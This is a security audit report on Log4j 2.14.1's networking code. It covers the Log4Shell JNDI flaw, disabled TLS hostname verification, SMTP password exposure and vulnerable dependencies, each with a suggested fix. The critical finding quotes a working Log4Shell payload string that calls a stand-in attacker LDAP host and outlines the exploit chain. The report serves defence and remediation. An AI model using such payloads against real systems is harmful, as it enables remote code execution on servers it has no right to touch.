# Security Review: Apache Log4j 2.14.1 (net module)

## CRITICAL

### JNDI lookup accepts attacker-controlled names — Log4Shell (CVE-2021-44228)
- **File:** `JndiManager.java:171`
- **Evidence:**
  ```java
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }
  ```
- **Attack Tree:**
  ```
  <external> → attacker-controlled string flows into a log message
    └─ log message is processed by a pattern layout containing %X, %m, or a ${jndi:} lookup substitution
      └─ StrLookup/JndiManager.lookup() is called with the attacker-controlled name (JndiManager.java:171)
        └─ javax.naming.Context.lookup(name) executes the JNDI lookup with no protocol restriction (JndiManager.java:172)
          └─ LDAP/RMI/CORBA server returns a serialized Java object or a Referenced object
            └─ Object deserialization / Reference loading executes arbitrary code in the victim JVM
  ```
- **Impact:** Remote code execution. An attacker supplies a JNDI URI (e.g., `ldap://attacker.com/exploit`) in any logged value (HTTP header, query parameter, POST body, etc.). The JNDI provider (LDAP/RMI) loads and instantiates a remote class, executing arbitrary code on the server. The `InitialContext` at line 180 is created with no protocol allowlist, no restrictions on factory classes, and no namespace binding restrictions — every JNDI protocol is reachable.
- **Exploit:** Log the string `${jndi:ldap://attacker.com:1389/Exploit}` on a vulnerable system. The attacker runs an LDAP server returning a `javaSerializedData` reference or a `javaClassName` pointing to a remote class factory. The JVM loads and executes the class.
- **Remediation:** Add a protocol allowlist that rejects `ldap:`, `rmi:`, `corba:`, `dns:` prefixes before calling `context.lookup()`, or set the JVM system property `com.sun.jndi.ldap.object.trustURLCodebase=false`. In Log4j 2.15.0+ the default `allowedJndiProtocols` is `null` by default (disabled). The fix at library level:

  ```java
  // In JndiManager.lookup():
  private static final Set<String> ALLOWED_PROTOCOLS =
      Set.of("java", "java-comp", "java-env");   // or per-config allowlist

  public <T> T lookup(final String name) throws NamingException {
      String lower = name.toLowerCase(java.util.Locale.ROOT);
      if (!lower.startsWith("java:") && !lower.startsWith("java-comp:") && !lower.startsWith("java-env:")) {
          throw new NamingException("JNDI protocol not allowed: " + name);
      }
      return (T) this.context.lookup(name);
  }
  ```

  Additionally, set `com.sun.jndi.ldap.object.trustURLCodebase=false` as a JVM-wide defense-in-depth measure.

## HIGH

### SSL hostname verification disabled by default — MITM risk
- **File:** `ssl/SslConfiguration.java:238`
- **Evidence:**
  ```java
    return new SslConfiguration(protocol, keyStoreConfig, trustStoreConfig, false);
  ```
- **Attack Tree:**
  ```
  <configuration> → SslConfiguration.createSSLConfiguration(protocol, keystore, truststore) called with 3 args
    └─ SslConfiguration.java:238 — verifyHostName defaults to false
      └─ UrlConnectionFactory.java:72-73 — !verifyHostName → LaxHostnameVerifier.INSTANCE installed
        └─ LaxHostnameVerifier.java:35-36 — verify() returns true for ANY hostname/certificate
          └─ Attacker performs MITM on the TLS connection; any certificate is accepted
  ```
- **Impact:** An attacker who can intercept TLS traffic (e.g., on the same network segment, DNS spoofing, BGP hijack) presents any certificate — self-signed, expired, or for a different domain — and the connection succeeds. All log data transmitted over SMTPS, TCP-TLS, or HTTPS is exposed. The `LaxHostnameVerifier` (`ssl/LaxHostnameVerifier.java:35`) unconditionally returns `true` for every certificate.
- **Remediation:** Change the default to `true` in `createSSLConfiguration` (3-arg overload):

  ```java
  public static SslConfiguration createSSLConfiguration(
      @PluginAttribute("protocol") final String protocol,
      @PluginElement("KeyStore") final KeyStoreConfiguration keyStoreConfig,
      @PluginElement("TrustStore") final TrustStoreConfiguration trustStoreConfig) {
      return new SslConfiguration(protocol, keyStoreConfig, trustStoreConfig, true);  // was false
  }
  ```

  Also set `ssl/SslConfigurationFactory.java:82` default to `true`:
  ```java
  boolean isVerifyHostName = props.getBooleanProperty(verifyHostName, true);  // was false
  ```

## MEDIUM

### SMTP credentials passed as plaintext through manager factory
- **File:** `SmtpManager.java:103`
- **Evidence:**
  ```java
    public static SmtpManager getSmtpManager(..., final String username, final String password, ...)
  ```
- **Attack Tree:**
  ```
  <configuration> → XML/log4j2.xml or programmatic API provides SMTP username/password
    └─ SmtpManager.java:98-103 — password passed as String parameter
      └─ SmtpManager.java:140-142 — password appended to StringBuilder for manager name
        └─ SmtpManager.java:146 — name string contains plaintext password, used as cache key
          └─ Password appears in logger output if AbstractManager logs the manager name
  ```
- **Impact:** The SMTP password is included verbatim in the manager's unique name string (`SMTP:<md5 of sb.toString()>`), where `sb` contains the password concatenated at line 141-142. While it is later hashed via MD5 for the cache key, the `FactoryData` object at line 297 stores the password as a `String` field. If any logging, toString(), or debugging output exposes the `FactoryData` or manager name, the credentials are disclosed in plaintext.
- **Remediation:** Zero out the password reference after use, log a redacted manager name, and mark the password field as `transient` or `sensitive` in the `FactoryData` toString() method.

## LOW / INFORMATIONAL

### EnvironmentPasswordProvider retains password as immutable String
- **File:** `ssl/EnvironmentPasswordProvider.java:52`
- **Evidence:**
  ```java
  final String password = System.getenv(passwordEnvironmentVariable);
  return password == null ? null : password.toCharArray();
  ```
- **Impact:** `System.getenv()` returns an immutable `String` that cannot be zeroed from memory. The password persists in the JVM heap until GC. This is a documented limitation (the class's own doc comment explains it), but it remains a weakness vs. `FilePasswordProvider` which can clear bytes.
- **Remediation:** Document the limitation more prominently; recommend `FilePasswordProvider` for production use.

## Checked and Cleared

- `TcpSocketManager.java:202` — hostname validation enforced (throws IllegalArgumentException on empty host); connect timeout configured; no attacker-controlled input path.
- `TcpSocketManager.java:394-412` — socket creation uses configured timeout and options; no raw input injection.
- `TcpSocketManager.java:463-494` — factory creates manager from config; host resolved via InetAddress.getByName (standard resolution, not attacker-controlled).
- `SslSocketManager.java:137-155` — SSL socket creation uses configured SslConfiguration; no insecure cipher selection.
- `SslSocketManager.java:169-198` — static factory creates SSL sockets with configured factory; no raw socket manipulation.
- `MulticastDnsAdvertiser.java:70-115` — mDNS advertiser; properties truncated to 255 bytes (line 74); reflection used only on known JmDNS classes (line 91, 104); no user-controlled class loading.
- `MulticastDnsAdvertiser.java:157-170` — buildServiceInfoVersion1 uses `new Hashtable<>(properties)` — safe copy of validated map.
- `MulticastDnsAdvertiser.java:173-186` — buildServiceInfoVersion3 uses known static method on ServiceInfo class — no dynamic class resolution.
- `ssl/KeyStoreConfiguration.java:96-125` — password from file/env/inline; validated exclusivity at line 106-108; no path traversal (path resolved at constructor time).
- `ssl/TrustStoreConfiguration.java:85-114` — same pattern as KeyStoreConfiguration; validated exclusivity at line 95-97.
- `ssl/FilePasswordProvider.java:56-82` — reads password from file path; clears bytes in finally block (line 77-80); file existence checked at construction.
- `ssl/MemoryPasswordProvider.java:30-51` — clones password char[] on get and construction; has clearSecrets(); documented as less secure.
- `ssl/AbstractKeyStoreConfiguration.java:65-101` — KeyStore loaded with password cleared after use (line 78-80); InputStream closed in try-with-resources.
- `UrlConnectionFactory.java:46-77` — creates HTTP(S) connections with timeouts; authorization via configurable provider; SSL factory applied when configured.
- `SmtpManager.java:182-219` — formatContentToBytes writes log events through layout; no SQL/command injection (JavaMail API, not interpreted).
- `SmtpManager.java:319-373` — SMTPManagerFactory builds JavaMail Session with configured properties; authenticator stores credentials in PasswordAuthentication (standard Java Mail pattern).
- `DatagramSocketManager.java:84-85` — content format map; static keys only, no injection.
- `AbstractSocketManager.java:78-79` — same content format pattern.
- `SocketAddress.java`, `SocketOptions.java`, `Protocol.java`, `Priority.java`, `Severity.java`, `Facility.java`, `Rfc1349TrafficClass.java`, `SocketPerformancePreferences.java`, `DatagramOutputStream.java`, `Advertiser.java`, `MimeMessageBuilder.java` — data classes / utility classes / interface definitions; no security-relevant operations.

## Dependencies

Output from dependency_review:

- **CRITICAL/HIGH — runtime-reachable:**
  - `org.apache.commons:commons-compress@1.20` — GHSA-4g9r-vxhx-9pgx (DoS on corrupted DUMP files). Runtime-reachable via `CommonsCompressAction.java` for rolling-archive compression. Attacker who can place crafted archives in the log-rotation directory triggers DoS. [fixed in 1.26.0] linked-findings: `log4j-core/src/main/java/.../CommonsCompressAction.java:3`
  - `org.liquibase:liquibase-core@3.5.3` — GHSA-jvfv-hrrc-6q72 (XXE in Liquibase changelog XML parsing). Affects consumers of `log4j-liquibase` module. [fixed in 4.8.0] linked-findings: `log4j-liquibase/src/main/java/`
  - Multiple test-only vulnerabilities flagged (H2 1.4.200 RCE, HSQLDB 2.5.1 RCE, assertj-core XXE, commons-io DoS, commons-lang3 recursion) — all `<scope>test</scope>`, not bundled in production artifacts.

- **Build-tooling only** (plexus-utils, maven-core) — not bundled.

## Remediation Summary

### Immediate (CRITICAL/HIGH)
1. `JndiManager.java:171` — Add JNDI protocol allowlist before `context.lookup(name)`; set `com.sun.jndi.ldap.object.trustURLCodebase=false` JVM-wide.
2. `ssl/SslConfiguration.java:238` — Change default `verifyHostName` from `false` to `true` in the 3-argument `createSSLConfiguration` overload.
3. `ssl/SslConfigurationFactory.java:82` — Change `props.getBooleanProperty(verifyHostName, false)` to default `true`.

### Short-term (MEDIUM)
1. `SmtpManager.java:140-142` — Redact password from manager name string; zero password after use in `FactoryData`.

### Hardening (LOW)
1. `ssl/EnvironmentPasswordProvider.java:52` — Document and recommend `FilePasswordProvider` for production; the String immutability limitation is inherent to `System.getenv()`.

### Dependencies
1. `pom.xml` — Bump `commons-compress` to ≥ 1.26.0.
2. `pom.xml` — Bump `liquibase-core` to ≥ 4.8.0.